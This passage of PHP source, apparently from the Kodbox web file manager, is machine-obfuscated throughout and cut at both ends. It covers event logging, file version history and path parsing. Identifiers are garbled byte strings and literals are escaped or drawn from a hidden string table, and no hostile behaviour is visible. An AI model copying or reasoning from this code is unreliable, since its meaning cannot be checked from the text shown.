array($¯¢¤å»[477], $¯¢¤å»[32], $¯¢¤å»[489], $¯¢¤å»[1995], $¯¢¤å»[1996])); $–Œëˆ€ª[$¯¢¤å»[2200]] = $¥ªáùÆ²; return $–Œëˆ€ª; } else { return array($¯¢¤å»[495] => 0, $¯¢¤å»[1978] => $¥ªáùÆ²[$¯¢¤å»[2144]], $¯¢¤å»[496] => $¯¢¤å»[12], $¯¢¤å»[1995] => $¯¢¤å»[2201]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\143\x65\137\x65\166\145\156\x74"; protected $dataAuto = array(array("\x63\162\145\141\164\x65\124\151\155\145", "\164\x69\x6d\145", "\x69\156\x73\x65\x72\x74", "\146\165\156\x63\x74\151\157\x6e"), array("\x64\x65\x73\x63", '', "\151\x6e\163\145\162\x74\54\x75\x70\x64\141\x74\x65\x2c\x73\x65\154\145\x63\x74", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ñ¤¹É®, $æ®‹•Ã», $„µ±ş–° = '') { $µÂÓúŠÍ =& $_SERVER[°‰†òö¯]; if (!$this->eventSave) { return; } $Ğ×±å· = Model($µÂÓúŠÍ[1419])->sourceInfo($ñ¤¹É®); if (!$Ğ×±å·) { return !1; } if ($this->isDisableEvent($Ğ×±å·, $æ®‹•Ã»)) { return; } if ($„µ±ş–° && is_string($„µ±ş–°)) { $„µ±ş–° = array($µÂÓúŠÍ[2011] => $„µ±ş–°); } $“ÎÎ©Í— = defined($µÂÓúŠÍ[2202]) ? USER_ID : 0; $Š­è¡ğƒ = array($µÂÓúŠÍ[493] => $ñ¤¹É®, $µÂÓúŠÍ[2203] => $Ğ×±å·[$µÂÓúŠÍ[192]], $µÂÓúŠÍ[2204] => $Ğ×±å·[$µÂÓúŠÍ[32]], $µÂÓúŠÍ[586] => !empty($Ğ×±å·[$µÂÓúŠÍ[586]]) ? $Ğ×±å·[$µÂÓúŠÍ[586]] : $µÂÓúŠÍ[12], $µÂÓúŠÍ[1762] => $“ÎÎ©Í—, $µÂÓúŠÍ[498] => $æ®‹•Ã», $µÂÓúŠÍ[1764] => $„µ±ş–°); $this->addSystemLog($æ®‹•Ã», $Š­è¡ğƒ); unset($Š­è¡ğƒ[$µÂÓúŠÍ[2204]], $Š­è¡ğƒ[$µÂÓúŠÍ[586]]); return $this->add($Š­è¡ğƒ); } private function addSystemLog($»‘£™Ó², $ ò“”·ö) { $â®œ¿çö =& $_SERVER[°‰†òö¯]; if ($»‘£™Ó² == $â®œ¿çö[2205]) { $»‘£™Ó² = $ ò“”·ö[$â®œ¿çö[528]][$â®œ¿çö[2206]]; } else { if (in_array($»‘£™Ó², array($â®œ¿çö[1951], $â®œ¿çö[2207]))) { $»‘£™Ó² = $ ò“”·ö[$â®œ¿çö[528]][$â®œ¿çö[171]]; } } $«˜öëšå = array_merge($ ò“”·ö, array($â®œ¿çö[2208] => $ ò“”·ö[$â®œ¿çö[193]], $â®œ¿çö[2209] => $ ò“”·ö[$â®œ¿çö[2209]])); Hook::trigger($â®œ¿çö[2210], $â®œ¿çö[2211] . $»‘£™Ó², $ ò“”·ö); Model($â®œ¿çö[1915])->addLog($â®œ¿çö[2211] . $»‘£™Ó², $«˜öëšå); } private function isDisableEvent($Û¤½ŞÛ, $´±¹¯±€) { $éó·‘¯Ú =& $_SERVER[°‰†òö¯]; if ($Û¤½ŞÛ[$éó·‘¯Ú[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($´±¹¯±€ == $éó·‘¯Ú[1940]) { return !1; } return !0; } public function eventCreate($€Ã‘ñ˜, $Øµ½É’) { $¦æ§úİú =& $_SERVER[°‰†òö¯]; $Èúùöûç = Model($¦æ§úİú[1419])->sourceInfo($€Ã‘ñ˜); $’Øª‚¡ = array($¦æ§úİú[2206] => $Øµ½É’, $¦æ§úİú[32] => $Èúùöûç[$¦æ§úİú[32]]); return $this->addEvent($€Ã‘ñ˜, $¦æ§úİú[2205], $’Øª‚¡); } public function eventFileEdit($“˜ŒÅÄÁ) { $Î…æ†•² =& $_SERVER[°‰†òö¯]; $óèå€Ë = array($Î…æ†•²[2212] => $_SERVER[$Î…æ†•²[2213]], $Î…æ†•²[2214] => strtolower(ACTION)); if (isset($GLOBALS[$Î…æ†•²[7]][$Î…æ†•²[2215]])) { $óèå€Ë[$Î…æ†•²[2215]] = $Î…æ†•²[91]; } return $this->addEvent($“˜ŒÅÄÁ, $Î…æ†•²[1941], $óèå€Ë); } public function eventRecycle($»ìè‹¥ï, $ì±°ÙÈ) { return $this->addEvent($»ìè‹¥ï, $_SERVER[°‰†òö¯][2207], $ì±°ÙÈ); } private static $_removeLast = ''; public function eventRemove($®×â÷Ÿ) { $’šØé¡® =& $_SERVER[°‰†òö¯]; self::$_removeLast = $®×â÷Ÿ; $â§¹ëñ = Model($’šØé¡®[1419])->sourceInfo($®×â÷Ÿ); $µ½›ÔÚ° = array_field_key($â§¹ëñ, array($’šØé¡®[193], $’šØé¡®[545], $’šØé¡®[507], $’šØé¡®[588])); $İššıê‰ = array($’šØé¡®[171] => $â§¹ëñ[$’šØé¡®[32]], $’šØé¡®[2214] => ACTION, $’šØé¡®[2216] => $µ½›ÔÚ°); return $this->addEvent($â§¹ëñ[$’šØé¡®[192]], $’šØé¡®[1940], $İššıê‰); } public function eventShare($£á¢¥à, $àû§›ñì) { return $this->addEvent($£á¢¥à, $_SERVER[°‰†òö¯][1951], $àû§›ñì); } public function eventMove($¸¯äìã, $¾ü¼ıŒö, $«ûÎ”¦—) { $Èü½¤éĞ =& $_SERVER[°‰†òö¯]; if (self::$_removeLast == $¸¯äìã) { return; } $ ®ÒáîÛ = Model($Èü½¤éĞ[1419]); $¬êÖÂØØ = $ ®ÒáîÛ->sourceInfo($¸¯äìã); $¬ÇÚ˜®© = $ ®ÒáîÛ->sourceInfo($¾ü¼ıŒö); $û™Ë–¡¦ = $ ®ÒáîÛ->sourceInfo($«ûÎ”¦—); $‰öù¸÷Á = array($Èü½¤éĞ[1239] => $¾ü¼ıŒö, $Èü½¤éĞ[2217] => $¬ÇÚ˜®©[$Èü½¤éĞ[32]], $Èü½¤éĞ[2193] => !empty($¬ÇÚ˜®©[$Èü½¤éĞ[586]]) ? $¬ÇÚ˜®©[$Èü½¤éĞ[586]] : $Èü½¤éĞ[12], $Èü½¤éĞ[1240] => $«ûÎ”¦—, $Èü½¤éĞ[2218] => $û™Ë–¡¦[$Èü½¤éĞ[32]], $Èü½¤éĞ[2219] => !empty($û™Ë–¡¦[$Èü½¤éĞ[586]]) ? $û™Ë–¡¦[$Èü½¤éĞ[586]] : $Èü½¤éĞ[12]); $this->addEvent($¸¯äìã, $Èü½¤éĞ[627], $‰öù¸÷Á); $¬êÖÂØØ = $ ®ÒáîÛ->sourceInfo($¸¯äìã); $‰öù¸÷Á = array($Èü½¤éĞ[193] => $¬êÖÂØØ[$Èü½¤éĞ[193]], $Èü½¤éĞ[32] => $¬êÖÂØØ[$Èü½¤éĞ[32]]); $this->addEvent($¾ü¼ıŒö, $Èü½¤éĞ[2220], $‰öù¸÷Á); } public function eventCopy($½–†Ü·) { $this->eventCreate($½–†Ü·, $_SERVER[°‰†òö¯][625]); } public function eventRename($×ò­ÂÇŸ, $É´Ç²ö, $äÔÍóñ¶) { $‘â÷™ô· =& $_SERVER[°‰†òö¯]; $¾ûŠê˜ = array($‘â÷™ô·[1239] => $É´Ç²ö, $‘â÷™ô·[1240] => $äÔÍóñ¶); return $this->addEvent($×ò­ÂÇŸ, $‘â÷™ô·[1433], $¾ûŠê˜); } public function eventAddComment($‰ª´”ëá, $¾­°–») { return $this->addEvent($‰ª´”ëá, $_SERVER[°‰†òö¯][2221], $¾­°–»); } public function eventAddDesc($–›Üîòá, $ÙööéÌü) { return $this->addEvent($–›Üîòá, $_SERVER[°‰†òö¯][2222], $ÙööéÌü); } public function listBySource($ÙçŒ¢€) { $•ü¼× =& $_SERVER[°‰†òö¯]; $Ø¦»¶‡ = Model($•ü¼×[1419])->sourceInfo($ÙçŒ¢€); $İª…ß¹ì = array($•ü¼×[493] => $ÙçŒ¢€); if ($Ø¦»¶‡[$•ü¼×[487]] == $•ü¼×[91]) { $Ó»İöËƒ = Model($•ü¼×[1419])->listSearchChildren($ÙçŒ¢€, 20000); $Ó»İöËƒ[] = $ÙçŒ¢€ . $•ü¼×[456]; $İª…ß¹ì = array($•ü¼×[193] => array($•ü¼×[7], $Ó»İöËƒ)); } $ıË¡¾ö¥ = $this->where($İª…ß¹ì)->order($•ü¼×[2223])->selectPage(); if ($ıË¡¾ö¥[$•ü¼×[444]][$•ü¼×[445]] == 0) { $ıË¡¾ö¥[$•ü¼×[444]][$•ü¼×[445]] = 1; $ıË¡¾ö¥[$•ü¼×[447]] = array(array($•ü¼×[493] => $ÙçŒ¢€, $•ü¼×[2203] => $Ø¦»¶‡[$•ü¼×[192]], $•ü¼×[1762] => $Ø¦»¶‡[$•ü¼×[529]], $•ü¼×[498] => $•ü¼×[2224], $•ü¼×[499] => $Ø¦»¶‡[$•ü¼×[233]], $•ü¼×[1764] => $•ü¼×[12])); } return $this->eventListParse($ıË¡¾ö¥, $ÙçŒ¢€); } private function eventListParse($šñĞ»Ú…, $ÁÁæ¤Ô¾) { $¡¯¯ÕÉ =& $_SERVER[°‰†òö¯]; $ï—Ä¥ØÊ = $šñĞ»Ú…[$¡¯¯ÕÉ[447]]; $ö”ç‚Ä = array_to_keyvalue($ï—Ä¥ØÊ, $¡¯¯ÕÉ[12], $¡¯¯ÕÉ[193]); $£·ÍĞÊ³ = array_to_keyvalue($ï—Ä¥ØÊ, $¡¯¯ÕÉ[12], $¡¯¯ÕÉ[2209]); foreach ($ï—Ä¥ØÊ as $šß¬¸Ê¤) { $Ô¥àø‰ = $šß¬¸Ê¤[$¡¯¯ÕÉ[528]]; if ($šß¬¸Ê¤[$¡¯¯ÕÉ[33]] == $¡¯¯ÕÉ[627] && isset($Ô¥àø‰[$¡¯¯ÕÉ[1239]])) { $ö”ç‚Ä[] = $Ô¥àø‰[$¡¯¯ÕÉ[1239]] . $¡¯¯ÕÉ[12]; $ö”ç‚Ä[] = $Ô¥àø‰[$¡¯¯ÕÉ[1240]] . $¡¯¯ÕÉ[12]; } if ($šß¬¸Ê¤[$¡¯¯ÕÉ[33]] == $¡¯¯ÕÉ[2220] && isset($Ô¥àø‰[$¡¯¯ÕÉ[193]])) { $ö”ç‚Ä[] = $Ô¥àø‰[$¡¯¯ÕÉ[193]] . $¡¯¯ÕÉ[12]; } } $ö”ç‚Ä = array_merge($ö”ç‚Ä, $£·ÍĞÊ³, array($ÁÁæ¤Ô¾ . $¡¯¯ÕÉ[12])); $ö”ç‚Ä = array_unique($ö”ç‚Ä); $¨£º—± = array_unique(array_to_keyvalue($ï—Ä¥ØÊ, $¡¯¯ÕÉ[12], $¡¯¯ÕÉ[1771])); $±‚ÉîÕ¦ = Model($¡¯¯ÕÉ[601])->userListInfo($¨£º—±); $ñ¯¾¶ç = Model($¡¯¯ÕÉ[891])->sourceListInfo($ö”ç‚Ä, !0); foreach ($ï—Ä¥ØÊ as &$šß¬¸Ê¤) { if ($šß¬¸Ê¤[$¡¯¯ÕÉ[33]] == $¡¯¯ÕÉ[627] && isset($šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[1239]])) { $šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[1239]] = $ñ¯¾¶ç[$šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[1239]]]; $šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[1240]] = $ñ¯¾¶ç[$šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[1240]]]; } if ($šß¬¸Ê¤[$¡¯¯ÕÉ[33]] == $¡¯¯ÕÉ[2220] && isset($šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[193]])) { $šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[193]] = $ñ¯¾¶ç[$šß¬¸Ê¤[$¡¯¯ÕÉ[528]][$¡¯¯ÕÉ[193]]]; } $šß¬¸Ê¤[$¡¯¯ÕÉ[90]] = $ñ¯¾¶ç[$šß¬¸Ê¤[$¡¯¯ÕÉ[193]]]; $šß¬¸Ê¤[$¡¯¯ÕÉ[2225]] = $ñ¯¾¶ç[$šß¬¸Ê¤[$¡¯¯ÕÉ[2209]]]; if ($šß¬¸Ê¤[$¡¯¯ÕÉ[33]] == $¡¯¯ÕÉ[1940]) { $šß¬¸Ê¤[$¡¯¯ÕÉ[2225]] = $šß¬¸Ê¤[$¡¯¯ÕÉ[90]]; $šß¬¸Ê¤[$¡¯¯ÕÉ[2209]] = $šß¬¸Ê¤[$¡¯¯ÕÉ[2225]][$¡¯¯ÕÉ[193]]; $šß¬¸Ê¤[$¡¯¯ÕÉ[90]] = !1; $šß¬¸Ê¤[$¡¯¯ÕÉ[193]] = $¡¯¯ÕÉ[12]; } $šß¬¸Ê¤[$¡¯¯ÕÉ[2152]] = $±‚ÉîÕ¦[$šß¬¸Ê¤[$¡¯¯ÕÉ[1771]]]; } unset($šß¬¸Ê¤); $šñĞ»Ú…[$¡¯¯ÕÉ[447]] = $ï—Ä¥ØÊ; return $šñĞ»Ú…; } public function removeBySource($ôï¿ïŒ–) { $ˆ¬à¡û = array($_SERVER[°‰†òö¯][493] => $ôï¿ïŒ–); $this->where($ˆ¬à¡û)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\x63\x65\137\x68\151\163\164\157\x72\171"; public function historyCount($ ğùñµó) { $ğæÎøé› =& $_SERVER[°‰†òö¯]; if (!$ ğùñµó) { return array(); } if (is_string($ ğùñµó) || is_int($ ğùñµó)) { $ ğùñµó = array($ ğùñµó); } $è¤ñˆÔö = array($ğæÎøé›[193], $ğæÎøé›[2226] => $ğæÎøé›[569]); $úÑ•¼¦ = array($ğæÎøé›[193] => array($ğæÎøé›[7], $ ğùñµó)); $ÀëŠÆö° = $this->field($è¤ñˆÔö)->where($úÑ•¼¦)->group($ğæÎøé›[193])->select(); return array_to_keyvalue($ÀëŠÆö°, $ğæÎøé›[193], $ğæÎøé›[569]); } public function addHistory($ª¹¬ÃÀ®, $¢¾Ó›Ò = '') { $»àº”“ =& $_SERVER[°‰†òö¯]; $ ÏƒçÔ¤ = array($»àº”“[493] => $ª¹¬ÃÀ®[$»àº”“[193]], $»àº”“[1762] => isset($ª¹¬ÃÀ®[$»àº”“[531]]) ? $ª¹¬ÃÀ®[$»àº”“[531]] : $ª¹¬ÃÀ®[$»àº”“[529]], $»àº”“[546] => $ª¹¬ÃÀ®[$»àº”“[545]], $»àº”“[624] => $ª¹¬ÃÀ®[$»àº”“[79]], $»àº”“[2227] => $¢¾Ó›Ò); if ($GLOBALS[$»àº”“[6]][$»àº”“[92]][$»àº”“[1300]] >= 1) { $this->historyAutoClear($ ÏƒçÔ¤[$»àº”“[193]]); $this->add($ ÏƒçÔ¤); } Hook::trigger($»àº”“[2228], $ ÏƒçÔ¤); Model($»àº”“[2229])->eventFileEdit($ª¹¬ÃÀ®[$»àº”“[193]]); } private function historyAutoClear($ˆ‹³â¦Ô) { $±ıƒÜ¶ =& $_SERVER[°‰†òö¯]; $ÃÈİşÉç = Model($±ıƒÜ¶[831])->get($±ıƒÜ¶[1322]); $øéÇ§Ô© = intval($GLOBALS[$±ıƒÜ¶[6]][$±ıƒÜ¶[92]][$±ıƒÜ¶[1300]]); $Üì®´›× = $ÃÈİşÉç == $±ıƒÜ¶[1323] ? min(5, $øéÇ§Ô©) : $øéÇ§Ô©; $Üì®´›× = $Üì®´›× <= 0 ? 0 : $Üì®´›× - 1; if ($Üì®´›× >= 499) { return; } $¹ıÌ¹…ï = array($±ıƒÜ¶[493] => $ˆ‹³â¦Ô); $¢ø®‚®© = $this->field($±ıƒÜ¶[2230])->where($¹ıÌ¹…ï)->order($±ıƒÜ¶[2223])->select(); if (!$¢ø®‚®© || $Üì®´›× >= count($¢ø®‚®©)) { return; } $±Ë ş‡ö = array_to_keyvalue($¢ø®‚®©, $±ıƒÜ¶[12], $±ıƒÜ¶[477]); $±Ë ş‡ö = array_slice($±Ë ş‡ö, $Üì®´›×); $”®ÃÛ¨Ÿ = array_to_keyvalue($¢ø®‚®©, $±ıƒÜ¶[12], $±ıƒÜ¶[545]); $”®ÃÛ¨Ÿ = array_slice($”®ÃÛ¨Ÿ, $Üì®´›×); if (!$±Ë ş‡ö || !$”®ÃÛ¨Ÿ) { return; } $¹ıÌ¹…ï = array($±ıƒÜ¶[495] => array($±ıƒÜ¶[7], $±Ë ş‡ö)); $this->where($¹ıÌ¹…ï)->delete(); Model($±ıƒÜ¶[548])->remove($”®ÃÛ¨Ÿ); } public function listData($‰µğÌÜ) { $ÈÚÉ½§© =& $_SERVER[°‰†òö¯]; $€úñ•®† = array($ÈÚÉ½§©[493] => $‰µğÌÜ); $—êÈ ¤ = $ÈÚÉ½§©[2231]; $àØøÊ½Ë = $this->field($—êÈ ¤)->where($€úñ•®†)->order($ÈÚÉ½§©[2223])->selectPage(); $this->_listAppendUser($àØøÊ½Ë[$ÈÚÉ½§©[447]]); $´‹ô¥ÇÒ = Model($ÈÚÉ½§©[831])->get($ÈÚÉ½§©[1322]); $ÊÊ¬«ªŞ = 5; if ($´‹ô¥ÇÒ == $ÈÚÉ½§©[1323]) { $àØøÊ½Ë[$ÈÚÉ½§©[447]] = array_slice($àØøÊ½Ë[$ÈÚÉ½§©[447]], 0, $ÊÊ¬«ªŞ); $àØøÊ½Ë[$ÈÚÉ½§©[444]] = array($ÈÚÉ½§©[2232] => 1, $ÈÚÉ½§©[2233] => 20, $ÈÚÉ½§©[2234] => 1, $ÈÚÉ½§©[2235] => count($àØøÊ½Ë[$ÈÚÉ½§©[447]])); } return $àØøÊ½Ë; } protected function _listAppendUser(&$¾Ñ÷–”) { $¨ÒºÚï€ =& $_SERVER[°‰†òö¯]; $æ†¨õÎ = array_to_keyvalue($¾Ñ÷–”, $¨ÒºÚï€[12], $¨ÒºÚï€[1771]); $®ÛÊá¨ = Model($¨ÒºÚï€[601])->userListInfo($æ†¨õÎ); foreach ($¾Ñ÷–” as &$ÖˆÄ‰Ûá) { $ÎêŠàÉä = $ÖˆÄ‰Ûá[$¨ÒºÚï€[1771]]; $ÖˆÄ‰Ûá[$¨ÒºÚï€[529]] = $®ÛÊá¨[$ÎêŠàÉä] ? $®ÛÊá¨[$ÎêŠàÉä] : !1; } unset($ÖˆÄ‰Ûá); } public function fileInfo($¶—×Íı­) { $ù®šÉ£ù =& $_SERVER[°‰†òö¯]; $Š˜Øùè = $this->tablePrefix; $åŠô¥¡ = "{$Š˜Øùè}\x69\157\x5f\x66\x69\154\145\x20\x66\x69\154\145\x73\x20\157\x6e\x20\146\151\x6c\x65\163\x2e\146\151\x6c\145\111\104\x20\75\40\150\x69\x73\164\x6f\162\171\56\x66\x69\154\x65\111\104"; return $this->alias($ù®šÉ£ù[2236])->where(array($ù®šÉ£ù[495] => $¶—×Íı­))->join($åŠô¥¡, $ù®šÉ£ù[2237])->find(); } public function removeItem($ãŞóÀÁÅ) { $ğ¼·Šš =& $_SERVER[°‰†òö¯]; $¯ôø—ô = array($ğ¼·Šš[495] => $ãŞóÀÁÅ); $„®ú½œ½ = $this->where($¯ôø—ô)->find(); if ($„®ú½œ½) { $¼“˜ıæû = $this->where($¯ôø—ô)->delete(); Model($ğ¼·Šš[548])->remove($„®ú½œ½[$ğ¼·Šš[545]]); return $¼“˜ıæû; } return !1; } public function removeBySource($ıÎáÃ¿®) { $Ïá¤ª« =& $_SERVER[°‰†òö¯]; if (!$ıÎáÃ¿®) { return !1; } if (!is_array($ıÎáÃ¿®)) { $ıÎáÃ¿® = array($ıÎáÃ¿®); } $úô²Ó¯ = array($Ïá¤ª«[493] => array($Ïá¤ª«[7], $ıÎáÃ¿®)); $ïƒÌ¶é‹ = $this->field($Ïá¤ª«[546])->where($úô²Ó¯)->select(); if ($ïƒÌ¶é‹) { $this->where($úô²Ó¯)->delete(); $ïú‡¯Ãƒ = array_to_keyvalue($ïƒÌ¶é‹, $Ïá¤ª«[12], $Ïá¤ª«[545]); Model($Ïá¤ª«[548])->remove($ïú‡¯Ãƒ); } return !0; } public function setDetail($”ÍÕ±Â“, $ì£ò ÓÛ) { $ûÆ©€ª =& $_SERVER[°‰†òö¯]; return $this->where(array($ûÆ©€ª[495] => $”ÍÕ±Â“))->save(array($ûÆ©€ª[2227] => $ì£ò ÓÛ)); } public function rollbackToItem($ğ¼£¿À, $Ø­ùÏª) { $ïƒ‘ñ± =& $_SERVER[°‰†òö¯]; $šÚĞå¢½ = Model($ïƒ‘ñ±[891])->sourceInfo($ğ¼£¿À); $this->addHistory($šÚĞå¢½, LNG($ïƒ‘ñ±[2238])); $­Ìîà = $this->find($Ø­ùÏª); $Àò“ó« = array($ïƒ‘ñ±[545] => $­Ìîà[$ïƒ‘ñ±[545]], $ïƒ‘ñ±[79] => $­Ìîà[$ïƒ‘ñ±[79]], $ïƒ‘ñ±[88] => time(), $ïƒ‘ñ±[531] => USER_ID); Model($ïƒ‘ñ±[891])->where(array($ïƒ‘ñ±[193] => $ğ¼£¿À))->save($Àò“ó«); return $this->where(array($ïƒ‘ñ±[495] => $Ø­ùÏª))->delete(); } public function clearSame($ö…’Õ­„) { $¼ë‹Š‰è =& $_SERVER[°‰†òö¯]; $Ä¢æÛ = $this->listData($ö…’Õ­„); $Ø×µìÂ’ = array_to_keyvalue_group($Ä¢æÛ, $¼ë‹Š‰è[545]); $¦¦¢“şò = array(); $‰í¹ÙÉ = array(); foreach ($Ø×µìÂ’ as $³†‚§€É) { if (!$³†‚§€É || count($³†‚§€É) <= 1) { continue; } foreach ($³†‚§€É as $üËŸ‡) { $¦¦¢“şò[] = $üËŸ‡[$¼ë‹Š‰è[545]]; $‰í¹ÙÉ[] = $üËŸ‡[$¼ë‹Š‰è[477]]; } } if (!$‰í¹ÙÉ) { return; } $this->where(array($¼ë‹Š‰è[477] => array($¼ë‹Š‰è[7], $‰í¹ÙÉ)))->delete(); Model($¼ë‹Š‰è[548])->remove($¦¦¢“şò); } public function userSpace() { $”©Ò©ƒÜ =& $_SERVER[°‰†òö¯]; $ù°ÕÄ¤ = $this->tablePrefix; $µ§È¨æÆ = array($”©Ò©ƒÜ[1762] => USER_ID); $šæš€Øí = "{$ù°ÕÄ¤}\x69\157\137\x66\151\154\x65\40\146\x69\x6c\145\163\40\x6f\x6e\x20\146\151\154\x65\163\x2e\146\151\154\x65\111\x44\40\75\40\150\x69\x73\164\x6f\x72\x79\x2e\x66\151\154\145\x49\x44"; return $this->alias($”©Ò©ƒÜ[2236])->where($µ§È¨æÆ)->join($šæš€Øí, $”©Ò©ƒÜ[2237])->sum($”©Ò©ƒÜ[79]); } } goto fÆÔï‚·‡; A†ìŠõ„íé: class KodIO { const KOD_SOURCE = "\173\x73\x6f\x75\162\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\x52\145\x63\x79\x63\154\x65\x7d"; const KOD_USER_FAV = "\173\165\163\x65\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\x46\x69\154\145\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\x46\x69\154\x65\124\x79\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\x6f\165\160\x52\157\x6f\x74\123\145\154\x66\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\123\x68\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\x65\x72\123\x68\x61\162\145\x4c\x69\x6e\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\x61\x72\x65\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\145\x49\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\111\x74\x65\155\x4c\151\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\141\162\x63\x68\175"; const KOD_BLOCK = "\173\x62\x6c\157\143\153\x7d"; const KOD_IO = "\173\151\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\145\156\143\x65\156\164\175"; const KOD_USER_DRIVER = "\173\144\162\151\166\145\162\x7d"; public static function typeList() { $—÷®Ï„ =& $_SERVER[°‰†òö¯]; return array($—÷®Ï„[1334] => self::KOD_SOURCE, $—÷®Ï„[1335] => self::KOD_USER_RECYCLE, $—÷®Ï„[1336] => self::KOD_USER_FAV, $—÷®Ï„[1337] => self::KOD_USER_FILE_TAG, $—÷®Ï„[1338] => self::KOD_USER_FILE_TYPE, $—÷®Ï„[1339] => self::KOD_GROUP_ROOT_SELF, $—÷®Ï„[1340] => self::KOD_USER_SHARE, $—÷®Ï„[1341] => self::KOD_USER_SHARE_LINK, $—÷®Ï„[1342] => self::KOD_USER_SHARE_TO_ME, $—÷®Ï„[1343] => self::KOD_SHARE_ITEM, $—÷®Ï„[1344] => self::KOD_SHARE_LINK, $—÷®Ï„[1345] => self::KOD_SEARCH, $—÷®Ï„[1346] => self::KOD_BLOCK, $—÷®Ï„[1347] => self::KOD_IO, $—÷®Ï„[1348] => self::KOD_USER_RECENT, $—÷®Ï„[1349] => self::KOD_USER_DRIVER); } public static function parse($¼—ÓÜş¨) { $ß…Áñèì =& $_SERVER[°‰†òö¯]; $¼—ÓÜş¨ = self::clear($¼—ÓÜş¨); $¥Œ¿‹è = array_values(self::typeList()); preg_match($ß…Áñèì[1350], $¼—ÓÜş¨, $¤Ş––œ); $œó³±óœ = array($ß…Áñèì[498] => !1, $ß…Áñèì[1351] => !1, $ß…Áñèì[495] => !1, $ß…Áñèì[87] => $¼—ÓÜş¨, $ß…Áñèì[1249] => !1, $ß…Áñèì[1248] => $ß…Áñèì[12]); if (is_array($¤Ş––œ) && count($¤Ş––œ) == 5) { $şÇê©õê = $ß…Áñèì[1352] . $¤Ş––œ[2] . $ß…Áñèì[404]; if (in_array($şÇê©õê, $¥Œ¿‹è)) { $œó³±óœ[$ß…Áñèì[1249]] = $¤Ş––œ[1]; $œó³±óœ[$ß…Áñèì[33]] = $şÇê©õê; $œó³±óœ[$ß…Áñèì[1353]] = substr($şÇê©õê, 1, -1); $œó³±óœ[$ß…Áñèì[477]] = $¤Ş––œ[3]; } $œó³±óœ[$ß…Áñèì[1248]] = $¤Ş––œ[4]; } $ÍÙæğÄŒ = array($ß…Áñèì[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $œó³±óœ[$ß…Áñèì[1316]] = in_array($œó³±óœ[$ß…Áñèì[33]], $ÍÙæğÄŒ); return $œó³±óœ; } public static function isTruePath($öäÎ¢ûë) { $ºæ±ÎËï =& $_SERVER[°‰†òö¯]; if (substr($öäÎ¢ûë, 0, 1) != $ºæ±ÎËï[1352]) { return !0; } if (strpos($öäÎ¢ûë, $ºæ±ÎËï[485]) === 0) { return !0; } if (strpos($öäÎ¢ûë, $ºæ±ÎËï[1320]) === 0) { return !0; } if (strpos($öäÎ¢ûë, $ºæ±ÎËï[1354]) === 0) { return !0; } if (strpos($öäÎ¢ûë, $ºæ±ÎËï[1355]) === 0) { return !0; } if (strpos($öäÎ¢ûë, $ºæ±ÎËï[1356]) === 0) { return !0; } return !1; } public static function clear($å÷áß) { $ÒÍ‡›îõ =& $_SERVER[°‰†òö¯]; $å÷áß = str_replace(array($ÒÍ‡›îõ[1154], $ÒÍ‡›îõ[287]), $ÒÍ‡›îõ[53], $å÷áß); $å÷áß = str_replace($ÒÍ‡›îõ[100], $ÒÍ‡›îõ[8], $å÷áß); $ÙÊ‰Ã‰¦ = $ÒÍ‡›îõ[1357]; if (substr($å÷áß, 0, 3) == $ÒÍ‡›îõ[1358]) { $å÷áß = substr($å÷áß, 3); } while (strstr($å÷áß, $ÙÊ‰Ã‰¦)) { $å÷áß = str_replace($ÙÊ‰Ã‰¦, $ÒÍ‡›îõ[8], $å÷áß); } $å÷áß = preg_replace($ÒÍ‡›îõ[1359], $ÒÍ‡›îõ[8], $å÷áß); if ($å÷áß == $ÒÍ‡›îõ[8]) { return $ÒÍ‡›îõ[8]; } $å÷áß = rtrim($å÷áß, $ÒÍ‡›îõ[8]); return $å÷áß; } public static function pathTrue($‚ËÓêİ¡) { $¯­â†‡Ó =& $_SERVER[°‰†òö¯]; if (!$‚ËÓêİ¡) { return $¯­â†‡Ó[12]; } $‚ËÓêİ¡ = str_replace($¯­â†‡Ó[256], $¯­â†‡Ó[8], str_replace($¯­â†‡Ó[1360], $¯­â†‡Ó[8], $‚ËÓêİ¡)); $‚ËÓêİ¡ = str_replace($¯­â†‡Ó[256], $¯­â†‡Ó[8], str_replace($¯­â†‡Ó[1360], $¯­â†‡Ó[8], $‚ËÓêİ¡)); if (!strstr($‚ËÓêİ¡, $¯­â†‡Ó[1358])) { return $‚ËÓêİ¡; } $›İÈ ‡è = explode($¯­â†‡Ó[8], $‚ËÓêİ¡); foreach ($›İÈ ‡è as $ßß“ÔôÈ => $ç™´½„ñ) { if ($ç™´½„ñ !== $¯­â†‡Ó[1361]) { continue; } for ($ğ»½Ïì = $ßß“ÔôÈ; $ğ»½Ïì >= 0; $ğ»½Ïì--) { if ($›İÈ ‡è[$ğ»½Ïì] === $¯­â†‡Ó[10] || $›İÈ ‡è[$ğ»½Ïì] 